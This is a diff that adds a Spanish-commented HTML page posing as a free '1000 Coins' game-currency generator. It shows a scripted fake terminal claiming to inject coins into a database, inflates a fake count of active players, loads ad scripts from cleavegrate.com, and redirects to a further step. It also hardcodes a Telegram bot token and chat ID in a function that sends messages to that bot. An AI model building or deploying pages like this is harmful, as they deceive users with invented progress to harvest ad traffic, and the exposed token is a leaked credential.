@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Generating 1000 Coins</title>
+
+<style>
+  :root{
+    --bg:#000000;
+    --fg:#ffffff;
+    --silver:#A0A0A0;
+    --silver-dim:#5a5a5a;
+    --wp:#25D366;
+    --yellow:#F8D849;
+    --green-success:#3ddc6a;
+  }
+  *{box-sizing:border-box; margin:0; padding:0;}
+  html,body{
+    height:100%;
+    background:var(--bg);
+    color:var(--fg);
+    font-family:'Courier New', 'Segoe UI', monospace, sans-serif;
+  }
+  body{
+    display:flex;
+    flex-direction:column;
+    min-height:100vh;
+    width:100vw;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+  }
+
+  .dot{
+    width:8px;height:8px;border-radius:50%;
+    background:#1f8b3c;
+    flex-shrink:0;
+  }
+  .dot.active{
+    background:#3ddc6a;
+    animation:blink 1s infinite;
+  }
+  @keyframes blink{50%{opacity:.3;}}
+
+  @keyframes buttonPulseGreen {
+    0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(61, 220, 106, 0.4); }
+    50% { transform: scale(1.03); box-shadow: 0 0 15px 6px rgba(61, 220, 106, 0.6); }
+  }
+
+  .panel{
+    width:100%;
+    max-width:380px;
+    background:#080808;
+    border:1px solid #222;
+    border-radius:10px;
+    padding:20px 16px;
+  }
+
+  /* ===== VERIFICACIÓN AMIGABLE (Estado 1) ===== */
+  #verificationState {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    gap: 14px;
+  }
+  #verificationState.active {
+    display: flex;
+    animation: fadeIn .3s ease;
+  }
+
+  .success-icon-container {
+    margin-bottom: 4px;
+  }
+
+  .verification-title {
+    color: #ffffff;
+    font-size: 18px;
+    font-weight: 800;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  }
+  .verification-title span { color: var(--green-success); }
+
+  .verification-steps {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    text-align: left;
+    width: 100%;
+    margin-top: 6px;
+    margin-bottom: 12px;
+    background: #0f0f0f;
+    padding: 14px;
+    border-radius: 10px;
+    border: 1px solid #1f1f1f;
+  }
+  .v-step { display: flex; align-items: center; gap: 12px; }
+  .v-step-num {
+    background: rgba(61, 220, 106, 0.15);
+    color: var(--green-success);
+    font-weight: 800;
+    font-size: 13px;
+    min-width: 24px;
+    height: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 50%;
+    border: 1px solid rgba(61, 220, 106, 0.3);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    flex-shrink: 0;
+  }
+  .v-step-txt {
+    color: #d1d5db;
+    font-size: 13px;
+    font-weight: 500;
+    line-height: 1.3;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  }
+  .v-step-txt strong { color: #ffffff; font-weight: 700; }
+  .v-step-txt .highlight { color: var(--green-success); font-weight: 800; }
+
+  .btn-green {
+    background: linear-gradient(135deg, #3ddc6a 0%, #1f8b3c 100%);
+    color: #ffffff;
+    border: none;
+    width: 100%;
+    padding: 16px;
+    border-radius: 8px;
+    font-weight: 800;
+    font-size: 14px;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(61, 220, 106, 0.2);
+    transition: transform .15s ease, filter .2s ease;
+    animation: buttonPulseGreen 2.5s infinite ease-in-out;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  }
+  .btn-green:hover { filter: brightness(1.1); transform: translateY(-2px); }
+
+  /* ===== ESTADO DE RESEÑA (Estado 2 al volver atrás) ===== */
+  #reviewState {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    gap: 14px;
+  }
+  #reviewState.active {
+    display: flex;
+    animation: fadeIn .4s ease;
+  }
+  .review-textarea {
+    width: 100%;
+    background: #0f0f0f;
+    border: 1px solid var(--green-success);
+    color: #fff;
+    border-radius: 8px;
+    padding: 12px;
+    min-height: 90px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    font-size: 14px;
+    resize: none;
+    outline: none;
+    margin-bottom: 8px;
+  }
+  .review-textarea::placeholder { color: #5a5a5a; }
+
+  @keyframes fadeIn{
+    from{opacity:0; transform:translateY(8px);}
+    to{opacity:1; transform:translateY(0);}
+  }
+
+  /* ===== CARGA TERMINAL (Diseño Original Intacto) ===== */
+  #loadingState{ display:block; }
+  .terminal{
+    background:#000; border:1px solid #1a1a1a; border-radius:8px; padding:12px;
+    font-size:12px; line-height:1.7; min-height:140px; max-height:160px; overflow-y:auto; color:var(--yellow); /* Color cambiado a amarillo para la terminal de monedas */
+  }
+  .terminal::-webkit-scrollbar{width:0;}
+  .term-line{ display:flex; gap:6px; opacity:0; animation:termIn .35s ease forwards; color:var(--silver); }
+  .term-line .ok{color:var(--yellow); flex-shrink:0;}
+  .term-line .txt{color:#d8d8d8;}
+  @keyframes termIn{ from{opacity:0; transform:translateX(-4px);} to{opacity:1; transform:translateX(0);} }
+
+  .progress-wrap{ margin-top:14px; }
+  .progress-label{ display:flex; justify-content:space-between; font-size:11px; color:var(--silver); margin-bottom:6px; letter-spacing:.5px; }
+  .progress-track{ width:100%; height:6px; background:#1a1a1a; border-radius:8px; overflow:hidden; border:1px solid #222; }
+  .progress-fill{ height:100%; width:0%; background:linear-gradient(90deg, var(--silver-dim), var(--yellow)); border-radius:8px; transition:width .2s linear; } /* Barra de progreso amarilla */
+
+  .modal-fans{ margin-top:14px; display:flex; align-items:center; justify-content:center; gap:8px; color:var(--silver); font-size:11px; }
+  .avatars{ display:flex; }
+  .avatars span{
+    width:22px;height:22px;
+    border-radius:50%;
+    background:linear-gradient(135deg,#333,#666);
+    border:1.5px solid #000;
+    margin-left:-8px;
+    display:inline-block;
+  }
+  .avatars span:first-child{margin-left:0;}
+
+  /* Adsterra: Ajustes para evitar cortes en banners chicos */
+  .ad-slot-small{
+    margin-top:10px;
+    margin-bottom:6px;
+    width:320px;
+    min-height:50px;
+    height:auto;
+    max-width:100%;
+    background:#0a0a0a;
+    border:1px dashed var(--silver-dim);
+    border-radius:8px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin-left:auto;
+    margin-right:auto;
+    position:relative;
+  }
+
+  .ad-slot-small iframe,
+  .ad-slot-big iframe {
+    max-width: 100% !important;
+    display: block !important;
+  }
+
+  .ad-slot-big {
+    margin-top:16px; width:300px; height:250px; background:#0a0a0a;
+    border:1px solid #1f1f1f; border-radius:12px; margin-left:auto; margin-right:auto;
+    position: relative; overflow:hidden; display:flex; justify-content:center; align-items:center;
+  }
+
+  /* Social bar */
+  #socialBar{
+    position:fixed; left:0; right:0; bottom:0; width:100%;
+    z-index:999; display:flex; justify-content:center; align-items:center;
+    background:#050505; border-top:1px solid #1a1a1a;
+  }
+</style>
+</head>
+<body>
+
+  <div class="panel">
+
+    <!-- Terminal (arranca directo al cargar) -->
+    <div id="loadingState">
+
+      <div class="terminal" id="terminal"></div>
+
+      <div class="progress-wrap">
+        <div class="progress-label">
+          <span id="progressMsg">Connecting to game servers...</span>
+          <span id="progressPct">0%</span>
+        </div>
+        <div class="progress-track">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+      </div>
+
+      <!-- ANUNCIO 320x50 DENTRO DE TERMINAL -->
+      <div class="ad-slot-small" id="adSlotBody2">
+        <script type="text/javascript">
+          atOptions = {
+            'key' : '87b04073200cdd655a562f19119611bb',
+            'format' : 'iframe',
+            'height' : 50,
+            'width' : 320,
+            'params' : {}
+          };
+        </script>
+        <script type="text/javascript" src="https://cleavegrate.com/87b04073200cdd655a562f19119611bb/invoke.js"></script>
+      </div>
+
+      <div class="modal-fans">
+        <span class="avatars"><span></span><span></span><span></span></span>
+        <span><strong id="fansCountModal">8,431</strong> players getting coins now</span>
+      </div>
+
+      <!-- BANNER 300x250 DENTRO DE TERMINAL -->
+      <div class="ad-slot-big" id="adSlotTerminalEnd">
+        <script type="text/javascript">
+          atOptions = {
+            'key' : '769d8d3d593ad963692e85dcad6fb33e',
+            'format' : 'iframe',
+            'height' : 250,
+            'width' : 300,
+            'params' : {}
+          };
+        </script>
+        <script type="text/javascript" src="https://cleavegrate.com/769d8d3d593ad963692e85dcad6fb33e/invoke.js"></script>
+      </div>
+    </div>
+
+  </div>
+
+  <div id="socialBar"></div>
+
+<script>
+  // ===== ARRANQUE DIRECTO DE LA TERMINAL =====
+  document.addEventListener("DOMContentLoaded", () => {
+    startLoadingProcess();
+  });
+
+  // ===== CONFIG TERMINAL =====
+  const TOTAL_TIME = 25000;
+
+  const TG_TOKEN = '8922992878:AAEBqGZAbwoopQNMgiAsnxkSYECVh3xFQ_s';
+  const TG_CHAT  = '1696446405';
+
+  function tgFetch(msg) {
+    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' })
+    }).catch(()=>{});
+  }
+
+  const stages = [
+    { time: 0,     msg: "Connecting to game servers..." },
+    { time: 5000,  msg: "Verifying your account..." },
+    { time: 10000, msg: "Allocating 1000 coins..." },
+    { time: 15000, msg: "Securing coin transfer..." },
+    { time: 20000, msg: "Finalizing transaction..." }
+  ];
+
+  const terminalTasks = [
+    { time: 300,   text: "Request received: 1000 Coins 🎮" },
+    { time: 2200,  text: "Establishing secure connection to server" },
+    { time: 3800,  text: "Connection established successfully" },
+    { time: 5400,  text: "Searching for user account details" },
+    { time: 7200,  text: "Account verification in progress" },
+    { time: 9000,  text: "Account verified and eligible ✨" },
+    { time: 10600, text: "Preparing coin package" },
+    { time: 12400, text: "Package ready: 1000 Coins 💰" },
+    { time: 14000, text: "Initiating secure transfer protocol" },
+    { time: 15600, text: "Injecting coins into database" },
+    { time: 17400, text: "Syncing data with main server" },
+    { time: 19000, text: "Transfer successful!" },
+    { time: 20600, text: "Performing final security check" },
+    { time: 22200, text: "Cleaning up connection logs" },
+    { time: 23800, text: "Almost done... preparing delivery 🎉" }
+  ];
+
+  const terminal = document.getElementById('terminal');
+  const progressMsg = document.getElementById('progressMsg');
+  const progressPct = document.getElementById('progressPct');
+  const progressFill = document.getElementById('progressFill');
+  const loadingState = document.getElementById('loadingState');
+  const fansCountModal = document.getElementById('fansCountModal');
+
+  let timeouts = [];
+  function addTerminalLine(text){
+    const line = document.createElement('div');
+    line.className = 'term-line';
+    line.innerHTML = `<span class="ok">✔</span><span class="txt">${text}</span>`;
+    terminal.appendChild(line);
+    terminal.scrollTop = terminal.scrollHeight;
+  }
+
+  function startLoadingProcess(){
+    loadingState.style.display = 'block';
+
+    terminal.innerHTML = '';
+    progressFill.style.width = '0%';
+    progressPct.textContent = '0%';
+    progressMsg.textContent = stages[0].msg;
+
+    stages.forEach(stage => {
+      const t = setTimeout(() => { progressMsg.textContent = stage.msg; }, stage.time);
+      timeouts.push(t);
+    });
+
+    terminalTasks.forEach(task => {
+      const t = setTimeout(() => { addTerminalLine(task.text); }, task.time);
+      timeouts.push(t);
+    });
+
+    const start = Date.now();
+    const interval = setInterval(() => {
+      const elapsed = Date.now() - start;
+      let pct = Math.min(100, (elapsed / TOTAL_TIME) * 100);
+      progressFill.style.width = pct + '%';
+      progressPct.textContent = Math.floor(pct) + '%';
+      if (pct >= 100) clearInterval(interval);
+    }, 100);
+
+    const finishTimeout = setTimeout(() => {
+      window.location.href = "paso3.html"; // Asegúrate de que esto apunte a tu paso 3
+    }, TOTAL_TIME);
+    timeouts.push(finishTimeout);
+  }
+
+  function bumpFans(){
+    if (!fansCountModal) return;
+    let current = parseInt(fansCountModal.textContent.replace(/,/g,''));
+    current += Math.floor(Math.random() * 3) + 1;
+    fansCountModal.textContent = current.toLocaleString('en-US');
+  }
+  setInterval(bumpFans, 6000);
+</script>
+
+<!-- SOCIAL BAR -->
+<script src="https://cleavegrate.com/99/eb/0b/99eb0b70935151c2bf675800e9484811.js"></script>
+
+</body>
+</html>
